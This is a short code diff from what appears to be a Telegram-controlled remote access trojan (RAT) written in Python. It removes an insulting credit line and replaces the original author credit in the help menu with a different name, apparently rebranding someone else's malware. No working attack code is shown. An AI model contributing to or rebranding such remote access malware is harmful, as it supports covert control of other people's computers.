@@ -1,4 +1,3 @@
-#Made By Olivier Flentge Jwz skids
 from RAT                           import *
 
 from Core.Settings.Organization    import *
@@ -1380,7 +1379,7 @@ def Help(command):
 		'\n*/BAT* - _Batch Scripting_'
 		'\n'
 		'\n'
-		'\n*Coded by Bainky | @bainki 👾*', 
+		'\n*Coded by SympactDev - Python*', 
 			reply_markup=menu, parse_mode='Markdown')
 
 
